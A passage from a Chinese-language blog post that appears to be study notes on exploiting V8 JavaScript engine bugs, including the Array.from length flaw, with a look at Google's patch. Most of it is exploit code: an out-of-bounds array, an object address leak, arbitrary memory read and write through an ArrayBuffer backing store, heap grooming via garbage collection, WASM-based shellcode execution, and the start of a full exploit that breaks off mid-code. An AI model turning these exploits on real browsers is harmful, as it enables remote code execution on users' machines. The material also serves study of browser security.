class="built_in">parseInt</span>(tmp[<span class="number">0</span>], <span class="number">16</span>);</span><br><span class="line">        <span class="comment">// console.log(hex(val));</span></span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">1</span>], <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//convert number to hex string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> typeConvert();</span><br></pre></td></tr></table></figure><h4 id="获得越界数组"><a href="#获得越界数组" class="headerlink" title="获得越界数组"></a>获得越界数组</h4><p>仿照POC那么做，弄一个可以越界的数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------get oob array-------------------------*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">    a1    = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">    a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">    a2    = [<span class="number">1.1</span>];</span><br><span class="line">    a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">26</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">a3.length = <span class="number">0x10000</span></span><br><span class="line">fun(<span class="number">1</span>);</span><br><span class="line">fun(<span class="number">1</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(fun);</span><br><span class="line">fun(...a3); <span class="comment">// "..." convert array to arguments list</span></span><br><span class="line"><span class="comment">// now, I have an oobArray : a2</span></span><br></pre></td></tr></table></figure><h4 id="泄漏对象地址"><a href="#泄漏对象地址" class="headerlink" title="泄漏对象地址"></a>泄漏对象地址</h4><p>这个也好做，像下面的做法，把要泄露的objTest，赋值给objLeak.leak，然后在a2（溢出数组）里搜0xdead，找到了-1就是要泄露的地址。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------leak object-------------------------*/</span></span><br><span class="line"><span class="keyword">var</span> objLeak = &#123;<span class="string">'leak'</span> : <span class="number">0x1234</span>, <span class="string">'tag'</span> : <span class="number">0xdead</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objTest = &#123;<span class="string">'a'</span>:<span class="string">'b'</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//search the objLeak.tag</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dt.f2i(a2[i]) == <span class="number">0xdead00000000</span>) &#123;</span><br><span class="line">        offset1 = i - <span class="number">1</span>; <span class="comment">//a2[offset1] -&gt; objLeak.leak</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">    objLeak.leak = target;</span><br><span class="line">    <span class="keyword">let</span> leak = dt.f2i(a2[offset1]);</span><br><span class="line">    <span class="keyword">return</span> leak;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"address of objTest : "</span> + hex(addressOf(objTest)));</span><br><span class="line">%DebugPrint(objTest);</span><br></pre></td></tr></table></figure><h4 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h4><p>定义一个ArrayBuffer，长度是0xbeef，然后在数组里找到它，然后就能获得ArrayBuffer.backing_store，就是要这个ArrayBuffer.backing_store，覆写它为target_addr，就能往target_addr里写东西了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------------------------arbitrary read and write-------------------------*/</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xbeef</span>);</span><br><span class="line"><span class="keyword">var</span> offset2;</span><br><span class="line"><span class="keyword">var</span> dtView = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//search the buf.size</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(dt.f2i(a2[i]) == <span class="number">0xbeef</span>) &#123;</span><br><span class="line">        offset2 = i + <span class="number">1</span>; <span class="comment">//a2[offset2] -&gt; buf.backing_store</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    a2[offset2] = dt.i2f(addr);</span><br><span class="line">    dtView.setFloat64(<span class="number">0</span>, dt.i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr, str=false</span>) </span>&#123;</span><br><span class="line">    a2[offset2] = dt.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp    = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> tmp2   = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">''</span></span><br><span class="line">    tmp[<span class="number">1</span>] = hex(dtView.getUint32(<span class="number">0</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    tmp[<span class="number">0</span>] = hex(dtView.getUint32(<span class="number">4</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        tmp2[<span class="number">0</span>] += tmp[<span class="number">0</span>].slice(i * <span class="number">2</span>, i * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">        tmp2[<span class="number">1</span>] += tmp[<span class="number">1</span>].slice(i * <span class="number">2</span>, i * <span class="number">2</span> + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = tmp2[<span class="number">0</span>] + tmp2[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0x'</span> + result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parseInt</span>(result, <span class="number">16</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test</span></span><br><span class="line">write64(addressOf(objTest) + <span class="number">0x18</span> - <span class="number">1</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'read in objTest + 0x18 : '</span> + hex(read64(addressOf(objTest) + <span class="number">0x18</span> - <span class="number">1</span>)));</span><br><span class="line">%DebugPrint(objTest);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><h4 id="利用WASM执行shellcode"><a href="#利用WASM执行shellcode" class="headerlink" title="利用WASM执行shellcode"></a>利用WASM执行shellcode</h4><p>没看懂。怎么就获得一块rwx内存然后执行它了，为什么一定要任意读写，直接造一块不行嘛。</p><p>我们实例化一个wasm的对象funcAsm，通过读取前面控制的JSArrayBuffer的内容可以得到funcAsm的地址。funcAsm实际上是一个JSFunction类型的对象，实际执行的代码位于一块rwx的内存中，通过任意地址写修改这块rwx内存的内容再调用funcAsm就可以执行任意代码了。</p><p>看来这块rwx内存的内容我们正常手段控制不了，害。我是沙笔，v8是沙箱还容得我任意瞎j执行？</p><p>这样找那块内存<code>wasmInstance.exports.main -&gt; shared_info -&gt; data -&gt; instance+0xe8</code>，一路调试找一下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>TODO: 谁能告诉我那坨wasmCode是什么东西???</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><a href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E!" target="_blank" rel="noopener">google官方的patch</a></p><p>没看太懂（呲牙），因为没分析成因。</p><h2 id="v8-利用入门-从越界访问到-rce"><a href="#v8-利用入门-从越界访问到-rce" class="headerlink" title="v8 利用入门-从越界访问到 rce"></a>v8 利用入门-从越界访问到 rce</h2><p><a href="https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/</a></p><p><a href="https://paper.seebug.org/1145/" target="_blank" rel="noopener">https://paper.seebug.org/1145/</a></p><h3 id="官方POC"><a href="#官方POC" class="headerlink" title="官方POC"></a>官方POC</h3><p>官方POC如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (&#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)&#125;);</span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure><p>debug版执行这段code的时候，v8会崩；release版直接越界操作。</p><h3 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p>oobArray的length与elements的length不一样，证明v8处理length的时候有问题。调试可见elements已经是一个空数组了，而oobArray的长度还是迭代器返回的。</p><p>具体代码不分析了，直接对着patch RTFSC就行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    TNode&lt;JSArray&gt; fast_array = CAST(array);</span><br><span class="line"></span><br><span class="line">    TNode&lt;Smi&gt; length_smi = CAST(length);  <span class="comment">//length_smi=length=8224</span></span><br><span class="line">    TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);<span class="comment">//old_length=array.length=0</span></span><br><span class="line">    CSA_ASSERT(<span class="keyword">this</span>, TaggedIsPositiveSmi(old_length));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) Ensure that the length is writable.</span></span><br><span class="line">    <span class="comment">// TODO(delphick): This check may be redundant due to the</span></span><br><span class="line">    <span class="comment">// BranchIfFastJSArray above.</span></span><br><span class="line">    EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime); <span class="comment">//确认length字段可写</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) If the created array already has a length greater than required,</span></span><br><span class="line">    <span class="comment">//    then use the runtime to set the property as that will insert holes</span></span><br><span class="line">    <span class="comment">//    into the excess elements and/or shrink the backing store.</span></span><br><span class="line">    <span class="comment">// 如果length_smi &lt; old_length则执行runtime以length_smi为准重新设置elements和length</span></span><br><span class="line">    GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个函数应该就是patch注释中说的"fast set"方式</span></span><br><span class="line">    <span class="comment">// 往array的length字段写入length_smi(8224)，却没有设置elements为相应大小的数组</span></span><br><span class="line">    StoreObjectFieldNoWriteBarrier(fast_array, <span class="attr">JSArray</span>::kLengthOffset,</span><br><span class="line">                                    length_smi);</span><br><span class="line"></span><br><span class="line">    Goto(&amp;done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个runtime应该是一个比较稳妥的设置方式，会同步设置elements和length</span></span><br><span class="line">BIND(&amp;runtime);</span><br><span class="line">&#123;</span><br><span class="line">    CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array),</span><br><span class="line">                CodeStubAssembler::LengthStringConstant(), length,</span><br><span class="line">                SmiConstant(LanguageMode::kStrict));</span><br><span class="line">    Goto(&amp;done);</span><br><span class="line">&#125;</span><br><span class="line">BIND(&amp;done);</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>跟上面差不多。</p><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>还是要一个ArrayBuffer，控制它的backing_store。</p><p>这里需要JSArrayBuffer落到一个释放的oobArray里，因为这里是数组先分配了，再把长度改短了，gc还没回收呢，别的对象分配不上去，所以要触发gc。触发gc可以通过删除对象引用实现，需要注意的一点是为了避免oobArray被gc完全回收，在最后一轮迭代后要设置oobArray.length为大于0的数如1。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* generate a Out-Of-Bound array and generate many ArrayBuffers and objects */</span></span><br><span class="line"><span class="keyword">var</span> bufArray = [];</span><br><span class="line"><span class="keyword">var</span> objArray = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">8224</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objGen</span>(<span class="params">tag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.leak = <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">this</span>.tag = tag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">x</span> =&gt;</span> (&#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">this</span>.counter++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length = <span class="number">1</span>;</span><br><span class="line">            bufArray.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xbeef</span>));</span><br><span class="line">            objArray.push(<span class="keyword">new</span> objGen(<span class="number">0xdead</span>));</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> x = <span class="number">0</span>; x &lt;= maxSize; x++) &#123;</span><br><span class="line">    <span class="keyword">let</span> y = oobArray[x]</span><br><span class="line">&#125;; <span class="comment">//trigger the GC</span></span><br></pre></td></tr></table></figure><h4 id="泄露内存地址"><a href="#泄露内存地址" class="headerlink" title="泄露内存地址"></a>泄露内存地址</h4><p>落进去以后，就通过标记来找到它。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> val = dt.f2i(oobArray[i]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xbeef00000000</span> === val) &#123;</span><br><span class="line">        offsetBuf = i - <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"buf offset: "</span> + offsetBuf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xdead00000000</span> === val) &#123;</span><br><span class="line">        offsetObjLeak = i - <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"objGen.leak offset: "</span> + offsetObjLeak);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用wasm执行任意代码"><a href="#利用wasm执行任意代码" class="headerlink" title="利用wasm执行任意代码"></a>利用wasm执行任意代码</h4><p>这个跟上面套路一模一样了。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>代码来源<a href="https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sunxiaokong</span></span><br><span class="line"><span class="comment">/*---------------------------datatype convert-------------------------*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//convert float to int</span></span><br><span class="line">    f2i(val) &#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span 